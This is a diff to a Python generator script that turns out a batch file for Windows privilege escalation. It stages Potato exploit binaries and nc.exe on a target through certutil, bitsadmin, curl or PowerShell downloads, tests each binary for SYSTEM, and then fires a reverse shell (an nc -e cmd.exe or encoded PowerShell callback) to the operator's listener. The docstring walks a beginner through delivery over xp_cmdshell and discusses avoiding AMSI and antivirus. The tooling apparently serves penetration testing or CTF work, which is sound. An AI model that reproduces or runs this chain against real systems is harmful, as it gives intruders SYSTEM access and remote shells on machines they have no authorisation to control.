@@ -1,42 +1,53 @@
 #!/usr/bin/env python3
-"""Stage + scan + FIRE every Potato in one paste — end-to-end from
-'attacker holds exes' to 'SYSTEM reverse shell on the winner'.
+"""winpriv.py -- your first SYSTEM shell in one paste (Route 1: Potato -> SYSTEM).
 
-Every Potato variant hits a different callback path (RPCSS / EFSRPC / DCOM OXID /
-BITS / Spooler), and modern-patched Windows (KB5004442 DCOM hardening + friends)
-breaks different ones. Rather than editing TOOL in _winpriv_common.py and running
-gen_full/nonet/forma between attempts — or hand-writing certutil fetch lines for
-each Potato — this generator prints ONE self-contained batch that:
+QUICKSTART:
+    1. Put every Potato exe you have + nc.exe in one folder:
+          mkdir -p ~/potatoes
+          cp GodPotato-NET4.exe EfsPotato.exe SharpEfsPotato.exe nc.exe ~/potatoes/
+    2. Start a listener:   nc -lvnp 443
+    3. Serve the folder:   cd ~/potatoes && sudo python3 -m http.server 80
+    4. Generate run.bat:   python3 winpriv.py --lhost YOUR_IP --potatoes ~/potatoes --fire > ~/potatoes/run.bat
+    5. Paste in mssqlclient (or any xp_cmdshell channel):
+          EXEC master..xp_cmdshell 'certutil -urlcache -f http://YOUR_IP/run.bat C:\\Windows\\Temp\\run.bat';
+          EXEC master..xp_cmdshell 'C:\\Windows\\Temp\\run.bat';
+    6. Watch your nc listener catch a SYSTEM shell.
 
-  1. auto-detects which Potato exes YOU have on the attacker box (--serve-dir, default `.`),
-     plus optionally nc.exe (--revtype nc, the default here) so the whole flow is self-contained,
-  2. STAGES each on target via a fallback chain — <preferred> -> certutil -> bitsadmin
-     -> curl -> powershell (Net.WebClient) -- reporting each attempt's exit + size so you
-     see the whole chain, not just the winner,
-  3. SCANS every staged Potato with a benign `whoami > marker` probe (no revshell,
-     no AV signal; hangs are hard-timed-out via taskkill),
-  4. with --fire: FIRES the SYSTEM revshell on the first Potato that landed SYSTEM
-     (nc callback by default -- edit revtype to swap for powershell).
+WHAT IT DOES (all in the ONE batch you paste on target):
+    STAGE  each Potato + nc.exe via certutil -> bitsadmin -> curl -> powershell,
+           reporting [TRIED via X: exit=N bytes=M] per attempt so failed transports
+           are visible. Size-guard rejects AV-nuked partial writes.
+    SCAN   each staged Potato with a benign `whoami > marker` probe, hard-timeout
+           any that hang (SweetPotato on hardened boxes is the classic hanger).
+    FIRE   (--fire) run the SYSTEM revshell via the first Potato that won SYSTEM.
+           Uses nc.exe when nc.exe is in your --potatoes folder (quiet, no AMSI in
+           the callback); otherwise a powershell revshell.
+    SUMMARY   what staged, what won, what fired.
 
-Usage:
-    python3 gen_potato_scan.py --serve-dir ~/potatoes > pscan.bat        # stage + scan
-    python3 gen_potato_scan.py --serve-dir ~/potatoes --fire > run.bat   # + auto-fire the winner
-    python3 gen_potato_scan.py --transport curl                          # try curl FIRST (fallbacks after)
-    python3 gen_potato_scan.py --verbose                                 # show transport error output
-    python3 gen_potato_scan.py --revtype powershell                      # PS revshell instead of nc
-    python3 gen_potato_scan.py --lhost 10.10.14.7 --lport 443            # override _winpriv_common.py
-    python3 gen_potato_scan.py --nc-path 'C:\\Windows\\Temp\\nc.exe'     # nc.exe location on target
-    python3 gen_potato_scan.py --no-stage                                # scan only (already staged)
-    python3 gen_potato_scan.py --no-scan                                 # stage only (don't probe)
-    python3 gen_potato_scan.py --include-rogue                           # + RoguePotato (needs socat)
-    python3 gen_potato_scan.py --stagedir 'D:\\path'                     # target-side landing dir
-    python3 gen_potato_scan.py --timeout 8                               # per-scan hard-kill (default 6s)
-    python3 gen_potato_scan.py EfsPotato.exe SharpEfsPotato.exe          # restrict to these
+BEGINNER FLAGS (usually all you need):
+    --lhost <ip>       your listener IP        (required for --fire)
+    --lport <n>        your listener port      (default: 443)
+    --potatoes <dir>   folder with Potato exes (default: .)
+    --fire             actually fire the revshell after the scan (default: stage+scan only)
 
-Delivery on target (via mssqlclient / xp_cmdshell):
-    -- attacker (in --serve-dir):  sudo python3 -m http.server 80
-    EXEC master..xp_cmdshell 'certutil -urlcache -f http://<LHOST>/pscan.bat C:\\Windows\\Temp\\pscan.bat';
-    EXEC master..xp_cmdshell 'C:\\Windows\\Temp\\pscan.bat';
+ADVANCED FLAGS (documented in ../CHEATSHEET.md):
+    --transport certutil|bitsadmin|curl|powershell   preferred transport (default: certutil)
+    --verbose          strip >nul redirects so failures print their real errors
+    --revtype nc|powershell   force a callback type (default: auto-detect from nc.exe presence)
+    --nc-path <path>   target-side nc.exe path if not %STAGE%\\nc.exe
+    --stagedir <path>  target-side landing dir (default: %STAGE% from _winpriv_common.py)
+    --serve-url <url>  http://x:PORT if not serving on 80
+    --timeout <n>      per-probe hard-kill seconds (default: 6)
+    --include-rogue    also probe RoguePotato (needs socat 135->target:9999 on your box)
+    --no-stage         skip stage phase (assume already on target)
+    --no-scan          stage only, don't probe
+    TOOL1 TOOL2 ...    restrict the batch to specific Potato exes
+
+WHEN THIS ISN'T ENOUGH:
+    Egress-blocked target?      -> gen_nonet.py (fully fileless via chunked b64)
+    Need in-memory-only load?   -> gen_full.py  (HTTP cradle + reflective load)
+    Otherwise this is the path — gen_full/gen_forma/gen_nonet all edit TOOL in
+    _winpriv_common.py; this handles the whole route without touching config files.
 """
 import os
 import sys
@@ -45,7 +56,7 @@ import _winpriv_common as P
 _a = sys.argv[1:]
 
 _FLAGS_WITH_ARG = {
-    "--stagedir", "--timeout", "--serve-dir", "--serve-url",
+    "--stagedir", "--timeout", "--serve-dir", "--serve-url", "--potatoes",
     "--transport", "--revtype", "--lhost", "--lport", "--nc-path",
 }
 _VALID_TRANSPORTS = ("certutil", "bitsadmin", "curl", "powershell")
@@ -63,14 +74,14 @@ def _opt(name, default=None, is_flag=False):
 # --- config resolution: CLI flag > _winpriv_common.py > sensible default ---------
 
 STAGE = (_opt("--stagedir") or P.STAGE).rstrip("\\")
-SERVE_DIR = os.path.abspath(_opt("--serve-dir") or ".")
+# --potatoes is the beginner-friendly alias for --serve-dir (either wins over the default).
+SERVE_DIR = os.path.abspath(_opt("--potatoes") or _opt("--serve-dir") or ".")
 SERVE_URL = (_opt("--serve-url") or f"http://{P.LHOST}").rstrip("/")
 INCLUDE_ROGUE = _opt("--include-rogue", is_flag=True)
 NO_STAGE = _opt("--no-stage", is_flag=True)
 NO_SCAN = _opt("--no-scan", is_flag=True)
 FIRE = _opt("--fire", is_flag=True)
 VERBOSE = _opt("--verbose", is_flag=True)
-REVTYPE = _opt("--revtype") or P.REVTYPE
 LHOST = _opt("--lhost") or P.LHOST
 try:
     LPORT = int(_opt("--lport") or P.LPORT)
@@ -81,6 +92,10 @@ try:
     TIMEOUT = int(_opt("--timeout") or 6)
 except (TypeError, ValueError):
     TIMEOUT = 6
+# --revtype: if the operator didn't say, auto-pick nc when nc.exe is in --potatoes
+# (a native callback avoids AMSI in the revshell path -- the classic gen_full failure);
+# else fall back to _winpriv_common.REVTYPE. Resolved AFTER LOCAL_NC discovery below.
+_REVTYPE_EXPLICIT = _opt("--revtype")
 
 # transport preference: pass --transport X to try X FIRST, others fall back after.
 _pref = _opt("--transport")
@@ -120,17 +135,6 @@ def _ps_revshell_b64(lhost: str, lport: int) -> str:
     return base64.b64encode(ps.encode("utf-16-le")).decode()
 
 
-if REVTYPE == "nc":
-    # nc.exe callback (native, no AMSI in the callback path). Preferred here because
-    # a native-PE launch avoids the Defender AMSI-signature issues we hit on the
-    # `powershell -e <b64>` route.
-    FIRE_PAYLOAD = f"cmd.exe /c {NC_PATH} {LHOST} {LPORT} -e cmd.exe"
-else:
-    # PowerShell revshell -- AMSI-scannable on the way in. Works when nc.exe is not
-    # stageable, but expect Defender to be more aggressive here.
-    FIRE_PAYLOAD = f"powershell -e {_ps_revshell_b64(LHOST, LPORT)}"
-
-
 # --- discover locally-staged Potato exes ----------------------------------------
 
 _canon = {k.lower(): k for k in P.POTATOES_CMDLINE}
@@ -147,6 +151,21 @@ if os.path.isdir(SERVE_DIR):
             LOCAL_TOOLS[canon] = fn
         elif fn.lower() == "nc.exe":
             LOCAL_NC = fn
+
+# Auto-detect revshell type: explicit --revtype wins; else nc when nc.exe is on
+# hand (native callback = no AMSI in the callback path); else module default.
+if _REVTYPE_EXPLICIT:
+    REVTYPE = _REVTYPE_EXPLICIT
+elif LOCAL_NC:
+    REVTYPE = "nc"
+else:
+    REVTYPE = P.REVTYPE
+
+# Build the fire payload with the resolved REVTYPE.
+if REVTYPE == "nc":
+    FIRE_PAYLOAD = f"cmd.exe /c {NC_PATH} {LHOST} {LPORT} -e cmd.exe"
+else:
+    FIRE_PAYLOAD = f"powershell -e {_ps_revshell_b64(LHOST, LPORT)}"
 
 # Which Potatoes go into the emitted batch:
 if NO_STAGE:
